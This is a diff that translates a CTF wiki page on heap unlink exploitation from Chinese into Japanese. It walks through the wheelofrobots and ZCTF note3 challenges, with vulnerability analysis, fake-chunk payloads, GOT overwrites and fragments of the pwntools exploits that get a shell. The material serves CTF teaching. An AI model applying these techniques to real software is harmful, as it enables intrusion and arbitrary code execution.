-由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 system 地址。
+このとき ptr[0] は got テーブルのアドレスなので、この note を直接編集して system のアドレスで上書きできます。
 
 #### get shell
 
@@ -945,12 +945,12 @@ sh.sendline('/bin/sh')
 sh.interactive()
 ```
 
-此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到shell了。
+このとき再び atoi を呼び出すと、実際に呼ばれるのは system 関数なので、shell を取得できます。
 
 ## 2017 insomni'hack wheelofrobots
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2017_insomni'hack_wheelofrobots)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2017_insomni'hack_wheelofrobots)
 
-### 基本信息
+### 基本情報
 
 ```shell
 ➜  2017_insomni'hack_wheelofrobots git:(master) file wheelofrobots
@@ -964,34 +964,34 @@ wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically 
     PIE:      No PIE (0x400000)
 ```
 
-动态链接64位，主要开启了 canary 保护与 nx 保护。
+動的リンクの 64 ビットで、主に canary と nx が有効になっています。
 
-### 基本功能
+### 基本機能
 
-大概分析程序，可以得知，这是一个配置机器人轮子的游戏，机器人一共需要添加 3 个轮子。
+プログラムをざっと分析すると、これはロボットの車輪を構成するゲームで、ロボットには合計 3 つの車輪を追加する必要があることがわかります。
 
-程序非常依赖的一个功能是读取整数，该函数read_num是读取指定的长度，将其转化为 int 类型的数字。
+プログラムが大きく依存している機能は整数の読み込みで、関数 read_num は指定された長さを読み込んで int 型の数値に変換します。
 
-具体功能如下
+具体的な機能は次のとおりです。
 
-- 添加轮子，一共有 6 个轮子可以选择。选择轮子时使用函数是read_num，然而该函数在读取的时候`read_num((char *)&choice, 5uLL);` 读取的长度是 5 个字节，恰好覆盖了 bender_inuse 的最低字节，即构成了 off-by-one 漏洞。与此同时，在添加 Destructor 轮子的时候，并没有进行大小检测。如果读取的数为负数，那么在申请`calloc(1uLL, 20 * v5);` 时就可能导致 `20*v5` 溢出，但与此同时， `destructor_size = v5`  仍然会很大。
-- 移除轮子，直接将相应轮子移除，但是并没有将其对应的指针设置为 NULL ，其对应的大小也没有清空。
-- 修改轮子名字，这个是根据当时申请的轮子的大小空间来读取数据。之前我们已经说过 destructor 轮子读取大小时，并没有检测负数的情况，所以在进行如下操作时 `result = read(0, destructor, 20 * destructor_size);` ，存在几乎任意长度溢出的漏洞。
-- 启动机器人，在启动的时候会随机地输出一些轮子的名称，这个是我们难以控制的。
+- 車輪の追加。選べる車輪は全部で 6 つあります。車輪の選択には関数 read_num を使いますが、この関数は読み込み時に `read_num((char *)&choice, 5uLL);` で 5 バイトを読み込み、ちょうど bender_inuse の最下位バイトを上書きしてしまいます。これが off-by-one の脆弱性になります。また、Destructor の車輪を追加するときにはサイズの検査が行われていません。読み込んだ数が負数だと、`calloc(1uLL, 20 * v5);` を確保するときに `20*v5` がオーバーフローする可能性がありますが、同時に `destructor_size = v5` は依然として非常に大きくなります。
+- 車輪の削除。該当する車輪をそのまま削除しますが、対応するポインタは NULL に設定されず、対応するサイズもクリアされません。
+- 車輪の名前の変更。そのとき確保した車輪のサイズに応じてデータを読み込みます。先に述べたとおり、destructor の車輪はサイズの読み込み時に負数の検査をしていないため、次の操作 `result = read(0, destructor, 20 * destructor_size);` では、ほぼ任意の長さのオーバーフローの脆弱性があります。
+- ロボットの起動。起動時にいくつかの車輪の名前がランダムに出力されますが、これは制御が難しい部分です。
 
-综上分析，我们可以知道的是，该程序主要存在的漏洞 off-by-one 与整数溢出。这里我们主要使用前面的off-by-one 漏洞。
+以上の分析から、このプログラムの主な脆弱性は off-by-one と整数オーバーフローであることがわかります。ここでは主に前者の off-by-one を使います。
 
-### 利用思路
+### 攻撃の考え方
 
-基本利用思路如下
+基本的な攻撃の考え方は次のとおりです。
 
-1. 利用 off by one 漏洞与 fastbin attack 分配 chunk 到 0x603138，进而可以控制 `destructor_size `的大小，从而实现任意长度堆溢出。这里我们将轮子1 tinny 分配到这里。
-2. 分别分配合适大小的物理相邻的 chunk，其中包括 destructor。借助上面可以任意长度堆溢出的漏洞，对 destructor 对应的 chunk 进行溢出，将其溢出到下一个物理相邻的 chunk，从而实现对 0x6030E8 处 fake chunk 进行 unlink 的效果，这时 bss 段的 destructor 指向 0x6030D0。从而，我们可以再次实现覆盖bss 段几乎所有的内容。
-3. 构造一个任意地址写的漏洞。通过上述的漏洞将已经分配的轮子1 tinny 指针覆盖为 destructor 的地址，那么此后编辑 tinny 即在编辑 destructor 的内容，进而当我们再次编辑 destructor 时就相当于任意低地址写。
-4. 由于程序只是在最后启动机器人的时候，才会随机输出一些轮子的内容，并且一旦输出，程序就会退出，由于这部分我们并不能控制，所以我们将 `exit()` patch 为一个 `ret` 地址。这样的话，我们就可以多次输出内容了，从而可以泄漏一些 got 表地址。**其实，既然我们有了任意地址写的漏洞，我们也可以将某个 got 写为 puts 的 plt 地址，进而调用相应函数时便可以直接将相应内容输出。但是这里并不去采用这种方法，因为之前已经在 hitcon stkof 中用过这种手法了。**
-5. 在泄漏了相应的内容后，我们便可以得到 libc 基地址，system 地址，libc中的 /bin/sh 地址。进而我们修改 free@got 为 system 地址。从而当再次释放某块内存时，便可以启动shell。
+1. off by one の脆弱性と fastbin attack を使ってチャンクを 0x603138 に確保させ、`destructor_size` の大きさを制御できるようにして、任意の長さのヒープオーバーフローを実現する。ここでは車輪 1 の tinny をここに確保する。
+2. 物理的に隣接する適切なサイズのチャンク(destructor を含む)をそれぞれ確保する。上記の任意の長さのヒープオーバーフローを使い、destructor に対応するチャンクをオーバーフローさせて次の物理的に隣接するチャンクまで書き込み、0x6030E8 にある fake chunk に対して unlink を行う効果を得る。このとき bss セグメントの destructor は 0x6030D0 を指す。これにより、bss セグメントのほぼすべての内容を再び上書きできる。
+3. 任意アドレス書き込みの脆弱性を構築する。上記の脆弱性で、確保済みの車輪 1 tinny のポインタを destructor のアドレスで上書きすると、以降 tinny を編集することは destructor の内容を編集することになり、再び destructor を編集すれば任意の低いアドレスへの書き込みに相当する。
+4. プログラムは最後にロボットを起動するときだけ車輪の内容をランダムに出力し、いったん出力するとプログラムが終了してしまう。この部分は制御できないため、`exit()` を `ret` のアドレスに patch する。こうすれば何度も出力でき、いくつかの got テーブルのアドレスをリークできる。**実は、任意アドレス書き込みの脆弱性がある以上、ある got を puts の plt のアドレスに書き換え、対応する関数を呼び出したときに内容を直接出力させることもできる。しかしここではこの方法は採らない。すでに hitcon stkof で使った手法だからである。**
+5. 内容をリークした後、libc のベースアドレス、system のアドレス、libc 内の /bin/sh のアドレスが得られる。そして free@got を system のアドレスに書き換える。これにより、再びメモリを解放したときに shell を起動できる。
 
-代码如下
+コードは次のとおりです。
 
 ```python
 from pwn import *
@@ -1167,7 +1167,7 @@ if __name__ == "__main__":
 
 ```
 
-### 题目
+### 問題
 
 - [DEFCON 2017 Qualifiers beatmeonthedl](https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl)
 
@@ -1178,15 +1178,15 @@ if __name__ == "__main__":
 
 
 ## note3
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/ZCTF_2016_note3)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/ZCTF_2016_note3)
 
-### 介绍
+### 紹介
 
-ZCTF 2016的一道题目，考点是safe unlink的利用。
+ZCTF 2016 の問題で、ポイントは safe unlink の悪用です。
 
-### 题目介绍
+### 問題の紹介
 
-题目是一个notepad，提供了创建、删除、编辑、查看笔记的功能
+問題はメモ帳(notepad)で、ノートの作成、削除、編集、表示の機能があります。
 
 ```
 1.New note
@@ -1197,7 +1197,7 @@ ZCTF 2016的一道题目，考点是safe unlink的利用。
 option--->>
 ```
 
-保护如下所示
+保護は次のとおりです。
 
 ```
 Canary                        : Yes
@@ -1207,9 +1207,9 @@ Fortify                       : No
 RelRO                         : Partial
 ```
 
-### 功能概述
+### 機能の概要
 
-程序New功能用来新建笔记，笔记的大小可以自定只要小于1024字节。
+プログラムの New 機能は新しいノートを作成するもので、ノートのサイズは 1024 バイト未満であれば自由に指定できます。
 
 ```
 int new()
@@ -1230,8 +1230,8 @@ int new()
 }
 ```
 
-所有的笔记malloc出来的指针存放在bss上全局数组bss_ptr中，这个数组最多可以存放8个heap_ptr。
-而且heap_ptr对应的size也被放在bss_ptr数组中。current_ptr表示当前笔记，bss布局如下。
+すべてのノートを malloc したポインタは bss 上のグローバル配列 bss_ptr に格納され、この配列には最大 8 個の heap_ptr を格納できます。
+また、heap_ptr に対応する size も bss_ptr 配列に置かれます。current_ptr は現在のノートを表します。bss のレイアウトは次のとおりです。
 
 ```
 .bss:
@@ -1254,12 +1254,12 @@ note6_size
 note7_size
 ```
 
-Show功能是无用的功能，edit和delete可以编辑和释放note。
+Show 機能は役に立たない機能で、edit と delete で note を編集、解放できます。
 
-### 漏洞
+### 脆弱性
 
-漏洞存在于edit功能中，这里面在获取用户输入的id号之后并没有进行验证。如果输入的id是负数的话依然可以执行。
-在get_num函数中存在整数溢出漏洞，我们可以获得一个负数。
+脆弱性は edit 機能にあります。ユーザが入力した id 番号を取得した後、検証が行われていません。入力した id が負数でもそのまま実行できます。
+get_num 関数には整数オーバーフローの脆弱性があり、負数を得ることができます。
 
 ```
 int edit()
@@ -1277,7 +1277,7 @@ int edit()
 }
 ```
 
-因此我们可以使得edit读入cuurent_ptr，使用的size是note7_ptr
+このため、edit が current_ptr に読み込むようにでき、そのとき使われる size は note7_ptr になります。
 ```
 .bss:
 current_ptr <== edit ptr
@@ -1298,7 +1298,7 @@ note5_size
 note6_size
 note7_size
 ```
-首先创建8个note，然后edit note3使current_ptr指向note3，之后使用-1溢出note3
+まず 8 個の note を作成し、次に note3 を edit して current_ptr を note3 に向け、その後 -1 を使って note3 をオーバーフローさせます。
 ```
 new(512,'a')
 new(512,'a')
@@ -1313,22 +1313,22 @@ edit(3,'a')
 edit(-9223372036854775808,data);
 ```
 
-我们使用的溢出数据是用于构造一个fake chunk来实现safe unlink的利用，具体的原理可以看这一章节的讲解。
+オーバーフローさせるデータは、fake chunk を構築して safe unlink を実現するためのものです。具体的な原理はこの章の解説を参照してください。
 
 ```
 data = ''
-data += p64(0) + p64(512+1) #fake chunk header
-data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk
+data += p64(0) + p64(512+1) #fake chunk のヘッダ
+data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #偽の fd と bk
 data += 'A'*(512-32)
 data += p64(512) + p64(512+16)
 ```
 
-之后释放note4，note3与note4就会合并。note3_ptr会指向note0_ptr的位置。这样我们通过不断的修改note0_ptr的值和edit note0就可以实现任意地址写数据。
+その後 note4 を解放すると、note3 と note4 が統合されます。note3_ptr は note0_ptr の位置を指すようになります。こうして、note0_ptr の値を繰り返し書き換えながら note0 を edit することで、任意アドレスへのデータ書き込みが実現できます。
 
-但是题目没有提供show功能，所以无法进行任意地址读，也就无法泄漏数据。
-这里采用的办法是把free的got表改为printf的值，然后在bbs中一块空白的区域写入"%x"。
-这样当free这块区域（这块区域在ptr_array中，所以可以直接传递给free），就可以泄漏出栈中的数据。
-通过栈中的libc地址求出system的地址就可以利用任意地址写获得shell
+しかしこの問題には show 機能がないため、任意アドレス読み出しができず、データをリークできません。
+ここで採る方法は、free の got テーブルを printf の値に書き換え、bss 内の空き領域に "%x" を書き込むことです。
+こうしてこの領域を free する(この領域は ptr_array 内にあるので、そのまま free に渡せます)と、スタック上のデータをリークできます。
+スタック上の libc のアドレスから system のアドレスを求め、任意アドレス書き込みを使って shell を取得できます。
 
 ```
 free(4)
@@ -1339,7 +1339,7 @@ edit(0,printf_plt)
 edit(3,p64(0x6020e8))
 edit(0,'%llx.'*30)
 ```
-完成的exp如下
+完全な exp は次のとおりです。
 
 ```
 #!/usr/bin/python
